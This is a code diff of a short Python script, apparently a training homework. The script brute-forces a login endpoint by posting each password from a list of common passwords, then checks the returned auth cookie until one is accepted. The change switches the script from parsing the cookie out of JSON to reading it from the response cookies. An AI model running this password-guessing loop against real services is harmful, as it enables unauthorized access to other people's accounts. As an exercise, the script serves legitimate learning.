@@ -12,17 +12,16 @@ passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678",
 for password in passwords:
     post_secret_password_homework_response = requests.post(post_secret_password_homework_url,
                                                            data={"login": login, "password": password})
-    print(post_secret_password_homework_response.text)
-    post_secret_password_homework_json = json.loads(post_secret_password_homework_response.text)
-    auth_cookie = post_secret_password_homework_json['auth_cookie']
+    auth_cookie = post_secret_password_homework_response.cookies.get("auth_cookie")
 
     check_auth_cookie_response = requests.post(post_check_auth_cookie_url,
-                                               data={"auth_cookie": auth_cookie})
-    check_auth_cookie_text = json.loads(check_auth_cookie_response.text)
+                                               cookies={"auth_cookie": auth_cookie})
 
-    if check_auth_cookie_text == "You are NOT authorized":
+    check_auth_cookie_response_text = check_auth_cookie_response.text
+
+    if check_auth_cookie_response_text == "You are NOT authorized":
         continue
     else:
         print(password)
-        print(check_auth_cookie_text)
+        print(check_auth_cookie_response_text)
         break
